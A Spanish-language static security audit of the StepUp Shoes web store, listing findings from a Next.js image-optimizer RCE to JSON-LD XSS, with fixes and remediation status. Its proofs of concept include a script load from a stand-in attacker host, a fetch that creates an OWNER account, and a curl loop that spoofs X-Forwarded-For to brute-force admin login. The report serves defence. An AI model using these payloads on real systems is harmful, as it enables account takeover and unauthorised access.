# Informe de seguridad — StepUp Shoes

**Fecha:** 2026-10-29
**Commit analizado:** `dee262d` (rama `master`)
**Alcance:** backend (Spring Boot 4.0.6 / Java 25), frontend (Next.js 15.5.18 / React 19), infra (Dockerfiles, docker-compose), configuración de Claude Code.
**Tipo de prueba:** revisión estática de código + escaneo de dependencias. **No** se hizo pentest dinámico contra el entorno desplegado.

---

## Resumen ejecutivo

| Severidad | Cantidad | Hallazgos |
|---|---|---|
| 🔴 Crítica | 1 | C-1 Next.js con RCE conocido en Image Optimizer, expuesto a cualquier host |
| 🟠 Alta | 3 | A-1 XSS almacenado en JSON-LD → toma de cuenta admin · A-2 Bypass del rate-limit de login por `X-Forwarded-For` · A-3 Dependencias backend con CVEs |
| 🟡 Media | 2 | M-1 Secretos por defecto inseguros en `application.yml` · M-2 Dependencias frontend con CVEs |
| 🔵 Baja | 4 | B-1 CSRF en POST sin body · B-2 Sin headers de seguridad en frontend · B-3 IP en claro en `refresh_tokens` · B-4 Sin detección de reuso de refresh token |

**Prioridad inmediata (hoy):** C-1 y A-1. Ambos son explotables y uno da ejecución remota de código en el servidor del frontend.

La base de seguridad del backend es **buena**: BCrypt(12), refresh tokens hasheados y rotados, roles leídos de la BD en cada request, `@PreAuthorize` + chequeos en service, validación con Bean Validation y `@SafeUrl`, queries parametrizadas, Swagger apagado en prod, contenedores sin root. Los problemas están en los bordes (frontend, proxy, dependencias y defaults).

---

## Estado de remediación (aplicado el 2026-10-29, sin commitear)

| Hallazgo | Estado | Cambio |
|---|---|---|
| C-1 | ✅ Corregido | `next` 15.5.18 → 15.5.28. `remotePatterns: '**'` **se mantiene**: el admin puede pegar URLs de imágenes de cualquier dominio y restringirlo rompería esas imágenes. Los RCE se corrigen con la versión. |
| A-1 | ✅ Corregido | Nuevo `toJsonLd()` en `frontend/lib/seo.ts` (escapa `<` → `<`), usado en `app/page.tsx` y `app/producto/[slug]/page.tsx` |
| A-2 | ✅ Corregido | `RequestUtils.getClientIp` usa el **último** valor de `X-Forwarded-For` + nuevo límite `LOGIN_EMAIL` (20 intentos/60 min por email, configurable con `RATE_LIMIT_LOGIN_EMAIL_*`). Test nuevo: `RequestUtilsTest` |
| A-3 | ✅ Corregido | Spring Boot 4.0.6 → 4.0.9. Re-escaneo OSV: **0 de 105** librerías vulnerables |
| M-1 | ✅ Corregido | `application-prod.yml`: `JWT_SECRET` sin default (falla el arranque si falta). `SUPER_ADMIN_*` con default vacío (el seeder no crea nada) |
| M-2 | ⚠️ Parcial | `npm audit fix` aplicado. Quedan: `postcss` interno de Next (solo build, CSS propio → no explotable) y `zod` (fix requiere v3 → v4, cambio de API) |
| B-1 | ⏳ Pendiente | Requiere decidir dominios (SameSite=Lax vs header custom) |
| B-2 | ⚠️ Parcial | `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy`, `Permissions-Policy` en `next.config.ts`. CSP pendiente (requiere pruebas en navegador) |
| B-3 | ✅ Corregido | IPs de `refresh_tokens` guardadas como SHA-256. Migración `V24__hash_refresh_token_ips.sql` (columnas a `VARCHAR(64)`) |
| B-4 | ✅ Corregido | Reuso de refresh token rotado (> 30 s de gracia) revoca todas las sesiones del usuario |
| Deny-list Claude | ⏳ Pendiente | Config personal, no del proyecto |

**Verificación:** `tsc --noEmit` y `next build` OK. Backend: tests nuevos/afectados en verde (`RequestUtilsTest` 3/3, `RateLimitServiceTest` 9/9, `AnalyticsEventServiceTest` 8/8). 8 fallos **preexistentes** no relacionados: 7 en `DashboardServiceTest` (no mockea `StorefrontEventService`) y `StepupApplicationTests` (requiere Docker).

---

## Pruebas ejecutadas

| # | Prueba | Herramienta / skill | Resultado |
|---|---|---|---|
| 0 | Config de Claude Code | `/ecc:security-scan` (AgentShield) | Nota A (97/100). Falta deny-list en `.claude/settings.local.json` |
| 1 | Seguridad Spring Boot | `/ecc:springboot-security` | A-2, M-1, B-1, B-3, B-4 |
| 2 | Revisión general frontend | `/ecc:security-review` | A-1, B-2 |
| 3 | Caza de vulnerabilidades explotables | `/ecc:security-bounty-hunter` | Confirmó la cadena de A-1 (XSS → acciones de admin). Sin SQLi, RCE en backend ni path traversal |
| 4a | CVEs frontend | `npm audit --omit=dev` | 9 vulnerables (1 crítica, 8 altas) → C-1, M-2 |
| 4b | CVEs backend | `mvnw dependency:list` + OSV.dev | 15 de 105 librerías vulnerables → A-3 |
| 5 | Infra | Revisión de Dockerfiles / `.gitignore` / historial git | OK (ver "Controles correctos") |

---

## 🔴 C-1 — Next.js 15.5.18 con RCE en Image Optimization API, abierto a cualquier dominio

- **Archivos:** `frontend/package.json` (`next ^15.3.0`, instalado 15.5.18), `frontend/next.config.ts:7-14`
- **CVE/Advisories (npm audit):**
  - *Unauthenticated RCE in Image Optimization API when SVG files are used* (`<=15.5.27`)
  - *Unauthenticated RCE in Image Optimization API when AVIF files are used* (`<15.5.24`)
  - además SSRF en rewrites/server actions, cache poisoning SSG/ISR y varios DoS.
- **Por qué es explotable aquí:** `next.config.ts` permite optimizar imágenes de **cualquier** host:
  ```ts
  remotePatterns: [{ protocol: 'https', hostname: '**' }]
  ```
  Un atacante anónimo puede pedir `/_next/image?url=https://atacante.com/payload.svg&w=64&q=75` y hacer que el servidor procese un archivo malicioso. No hace falta login.
- **Impacto:** ejecución de código en el contenedor del frontend (Railway): robo de variables de entorno, pivote.
- **Corrección:**
  1. `cd frontend && npm install next@15.5.28 eslint-config-next@15.5.28`
  2. Restringir orígenes de imágenes a los que realmente se usan:
     ```ts
     images: {
       remotePatterns: [{ protocol: 'https', hostname: 'res.cloudinary.com' }],
     },
     ```
  3. Re-ejecutar `npm audit --omit=dev`.

---

## 🟠 A-1 — XSS almacenado en JSON-LD → un EDITOR puede actuar como SUPER_ADMIN

- **Archivos:**
  - `frontend/app/producto/[slug]/page.tsx:256-260` (JSON-LD de producto: `name`, `description`, `categoryName`)
  - `frontend/app/page.tsx:184-190` (JSON-LD de organización: datos de settings)
- **Código vulnerable:**
  ```tsx
  <script type="application/ld+json"
    dangerouslySetInnerHTML={{ __html: JSON.stringify(buildProductJsonLd(product)) }} />
  ```
  `JSON.stringify` **no escapa `<`**. Si el nombre o la descripción contiene `</script>`, el parser HTML cierra el bloque y lo que sigue se ejecuta como HTML/JS. El backend no filtra `<` en esos campos (solo `@Size`).
- **PoC (requiere rol EDITOR, el rol de escritura más bajo):**
  Editar un producto activo y poner en la descripción:
  ```
  Zapatilla</script><script src="https://atacante.com/x.js"></script>
  ```
  `x.js` se ejecuta para **todos** los visitantes de `/producto/<slug>`.
- **Escalada:** el backend acepta el origen del frontend con `allowCredentials=true` y las cookies son `SameSite=None`. Si un SUPER_ADMIN/OWNER logueado abre esa página, el script puede hacer:
  ```js
  fetch(API + '/users', { method: 'POST', credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'x@evil.com', password: '...', fullName: 'x', role: 'OWNER' }) })
  ```
  → el EDITOR obtiene una cuenta OWNER. También permite phishing/redirección a todos los clientes de la tienda.
- **Corrección (una línea, en ambos archivos):**
  ```tsx
  const toJsonLd = (data: unknown) => JSON.stringify(data).replace(/</g, '\\u003c')
  // ...
  dangerouslySetInnerHTML={{ __html: toJsonLd(buildProductJsonLd(product)) }}
  ```
  Opcional como defensa en profundidad: rechazar `<` y `>` en `name` del producto en el backend.

---

## 🟠 A-2 — Bypass del rate-limit de login falsificando `X-Forwarded-For`

- **Archivos:** `backend/src/main/java/com/stepup/common/util/RequestUtils.java:25-33`, `AuthService.java:48-54, 105-111`
- **Problema:** la IP del cliente se toma del **primer** valor de `X-Forwarded-For`, que lo controla el cliente. La clave del rate-limit es `ipHash + emailHash`, así que cambiando el header en cada intento el atacante obtiene un contador nuevo cada vez.
- **PoC:**
  ```bash
  for i in $(seq 1 1000); do
    curl -s -X POST https://<backend>/api/v1/auth/login \
      -H "Content-Type: application/json" -H "X-Forwarded-For: 10.0.$((i/250)).$((i%250))" \
      -d '{"email":"admin@tienda.com","password":"intento'$i'"}'
  done
  ```
  Nunca devuelve 429.
- **Impacto:** fuerza bruta ilimitada contra cuentas admin (el panel administra productos, usuarios y roles).
- **Verificar:** depende de cómo el proxy de Railway reescribe `X-Forwarded-For`. Si **añade** la IP real al final (comportamiento habitual), el bypass funciona.
- **Corrección:**
  1. Tomar la IP **añadida por el proxy de confianza** (el último valor de `X-Forwarded-For`), o configurar `server.forward-headers-strategy: native` con los proxies de Railway como confiables y usar `request.getRemoteAddr()`.
  2. Añadir además un límite **solo por email** (p. ej. 20 intentos/hora), independiente de la IP.
  3. `AuthService.extractIp()` duplica la misma lógica; reemplazarla por `RequestUtils`.

---

## 🟠 A-3 — Dependencias del backend con CVEs conocidos

Escaneo de 105 librerías runtime contra OSV.dev: **15 vulnerables**. Las más relevantes:

| Librería | Versión | Peor severidad | Notas |
|---|---|---|---|
| `tomcat-embed-core` | 11.0.21 | Crítica | Varias críticas son de Digest/FORM auth, AJP o WebDAV (**no usados**). Aplica *HTTP/2 request headers not validated* y *Security constraints not correctly applied* (mitigado porque la autorización la hace Spring Security). |
| `spring-webmvc` / `spring-web` | 7.0.7 | Crítica | XsltView/JSP/SSE no se usan. Aplican open redirect, multipart smuggling y path traversal de recursos estáticos. |
| `jackson-databind` / `jackson-core` (2.x y 3.x) | 2.21.2 / 3.1.2 | Alta | `@JsonIgnore`/`@JsonView` bypass en records y DoS de parseo. Los DTOs son records: revisar tras actualizar. |
| `spring-data-commons` | 4.0.5 | Alta | DoS por `sort`/property paths: los endpoints de listado aceptan paginación del cliente. |
| `postgresql` (pgjdbc) | 42.7.10 | Alta | Downgrade de channel binding / DoS SCRAM. |
| `spring-expression` | 7.0.7 | Alta | DoS de SpEL (`@PreAuthorize` usa expresiones fijas, bajo riesgo). |
| `spring-security-web` | 7.0.5 | Media | Open redirect post-login (no aplica: API stateless). |

- **Corrección:** subir `spring-boot-starter-parent` de `4.0.6` a **`4.0.9`** (último patch de la misma línea, sin cambios de API), luego `./mvnw test` y re-escanear. Fijar `postgresql` a la última 42.7.x si Boot no la trae.
- **Recomendado:** activar Dependabot/Renovate en GitHub para Maven y npm.

---

## 🟡 M-1 — Valores por defecto inseguros que se usan en producción si falta una variable

- **Archivo:** `backend/src/main/resources/application.yml:47, 101-102`
  ```yaml
  secret: ${JWT_SECRET:dev-secret-change-this-in-production-must-be-at-least-64-chars-long}
  email: ${SUPER_ADMIN_EMAIL:superadmin@stepup.local}
  password: ${SUPER_ADMIN_PASSWORD:changeme}
  ```
  `application-prod.yml` no los sobreescribe, así que si en Railway falta `JWT_SECRET` el backend **arranca igual** con un secreto conocido. Con ese secreto cualquiera firma un JWT con el email del SUPER_ADMIN (el filtro carga el usuario por email) → toma total del sistema. Igual con `SUPER_ADMIN_*` en el primer despliegue: crea `superadmin@stepup.local / changeme`.
- **Mitigantes:** el repo es privado (la API de GitHub devuelve 404) y no hay secretos reales en el historial de git (verificado).
- **Corrección:** en `application-prod.yml` declarar sin default para que el arranque falle si faltan:
  ```yaml
  app:
    security:
      jwt:
        secret: ${JWT_SECRET}
    super-admin:
      email: ${SUPER_ADMIN_EMAIL}
      password: ${SUPER_ADMIN_PASSWORD}
  ```
  Y confirmar hoy en Railway que `JWT_SECRET` está definido (≥ 64 caracteres aleatorios).

---

## 🟡 M-2 — Dependencias del frontend con CVEs (además de Next)

| Paquete | Severidad | Resumen |
|---|---|---|
| `axios` 1.x ≤ 1.19.0 | Alta | Prototype pollution en construcción de requests |
| `follow-redirects` 1.16.0 | Alta | Filtra headers de credenciales en redirecciones cross-origin |
| `form-data` 4.0.0-4.0.5 | Alta | Inyección CRLF en multipart |
| `sharp` ≤ 0.35.5 | Alta | CVEs de libvips/libheif/librsvg (lo usa el Image Optimizer → refuerza C-1) |
| `postcss`, `source-map-js`, `nanoid` | Alta | Build-time / DoS |
| `zod` < 4.6.6 | Alta | DoS de memoria; el fix es un salto de versión mayor (v3 → v4) |

- **Corrección:** `npm audit fix` (sin `--force`). Migrar `zod` a v4 en una tarea aparte, porque cambia la API.

---

## 🔵 Hallazgos bajos

**B-1 — CSRF en endpoints POST sin body.** `SecurityConfig.java:66` deshabilita CSRF y la sesión vive en cookies `SameSite=None` (`application.yml:57`). Los endpoints con JSON quedan protegidos de forma indirecta (un formulario cross-site no puede mandar `application/json`), pero los POST **sin body** sí se pueden forjar desde otro sitio: `/products/{id}/restore`, `/categories/{id}/restore`, `/messages/{id}/restore`, `/control-center/restore/{id}`, `/auth/logout`. El impacto es bajo porque hace falta conocer UUIDs. **Fix:** si frontend y backend comparten dominio raíz, usar `SameSite=Lax`. Si no, exigir un header custom (`X-Requested-With`) en métodos no-GET con un filtro.

**B-2 — Sin headers de seguridad en el frontend.** `next.config.ts` no define `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy` ni `X-Content-Type-Options`. Así `/admin` puede embeberse en un iframe (clickjacking) y no hay CSP que limite A-1. **Fix:** añadir `headers()` en `next.config.ts` con al menos `frame-ancestors 'none'`, `nosniff` y `strict-origin-when-cross-origin`.

**B-3 — IP en claro en `refresh_tokens.created_by_ip`.** `AuthService.extractIp()` (línea 168) guarda la IP sin hashear, al contrario de la política documentada en `RequestUtils` ("the raw IP should never leave this class"). Es un tema de privacidad. **Fix:** usar `RequestUtils.getClientIpHash()`.

**B-4 — Sin detección de reuso de refresh token.** Si se presenta un refresh token ya rotado (`AuthService.java:120`), solo se rechaza. No se revocan los demás tokens del usuario, así que un token robado que se use primero sigue funcionando. **Fix:** al detectar reuso de un token revocado, ejecutar `revokeAllActiveByUserId`.

**Config Claude Code (AgentShield):** falta deny-list en `.claude/settings.local.json`. Sugerido: `Bash(rm -rf:*)`, `Bash(git push --force:*)`, `Read(.env*)`.

---

## Controles correctos (verificados)

- Contraseñas con BCrypt cost 12. El secreto JWT exige ≥ 32 bytes al arrancar.
- Access token de 15 min en cookie `httpOnly` + `Secure`. Ya no hay tokens en `localStorage` (con limpieza de tokens legacy).
- Refresh tokens: aleatorios, guardados como SHA-256, rotados en cada uso y revocados al bloquear, borrar o cambiar el rol.
- El filtro JWT recarga el usuario y sus roles desde la BD en cada request: los cambios de rol o bloqueos aplican de inmediato.
- Jerarquía de roles en `UserService` (no se puede crear ni modificar SUPER_ADMIN, ni asignar un rol ≥ al propio).
- Autorización en doble capa: `@PreAuthorize` en controllers y chequeos de rol en services (settings, messages).
- Validación con Bean Validation y `@SafeUrl`, que solo acepta http/https o rutas relativas (bloquea `javascript:`).
- Sin SQL concatenado: Criteria API y `@Query` con parámetros.
- Cloudinary: el backend firma, el folder lo decide el servidor, `publicId` validado contra traversal y acotado a folders permitidos.
- `GlobalExceptionHandler` devuelve mensajes genéricos (sin stack traces). Login con error genérico "Invalid email or password".
- Formulario de contacto con honeypot y rate-limit.
- Swagger/OpenAPI deshabilitado en prod. `ddl-auto: validate`.
- Dockerfiles multi-stage con usuario no-root (`stepup`, `nextjs`).
- `.env` en `.gitignore`. Sin secretos reales en el historial de git. Repo privado.

---

## Plan de remediación sugerido

| Orden | Acción | Esfuerzo |
|---|---|---|
| 1 | C-1: `next@15.5.28` + restringir `remotePatterns` a Cloudinary | 15 min |
| 2 | A-1: escapar `<` en los dos JSON-LD | 10 min |
| 3 | M-1: confirmar `JWT_SECRET` en Railway y quitar defaults en prod | 15 min |
| 4 | A-2: IP desde el proxy de confianza + límite por email | 1 h |
| 5 | A-3: Spring Boot 4.0.9 + tests | 30 min - 1 h |
| 6 | M-2: `npm audit fix` | 15 min |
| 7 | B-1…B-4, headers y deny-list | 1-2 h |
| 8 | Activar Dependabot y añadir `npm audit` + OSV/dependency-check al CI | 30 min |

---

## Limitaciones de esta revisión

- **Sin pruebas dinámicas:** no se atacó el entorno de Railway. Los PoC de A-1 y A-2 están razonados desde el código, no ejecutados. A-2 depende del comportamiento del proxy de Railway.
- **`semgrep` no está instalado.** No se corrió análisis SAST automático, solo revisión manual dirigida (auth, autorización, entradas públicas, queries, uploads, renderizado HTML).
- **OWASP dependency-check no se corrió** (requiere descargar la base NVD). Se usó OSV.dev, que cubre los mismos advisories de GitHub.
- No se revisaron a fondo: lógica de restore de snapshots (`RestoreService`, solo SUPER_ADMIN), todas las migraciones SQL ni todos los componentes del panel admin.
- Recomendado como siguiente paso: OWASP ZAP contra un entorno de staging y la skill `/ecc:production-audit`.
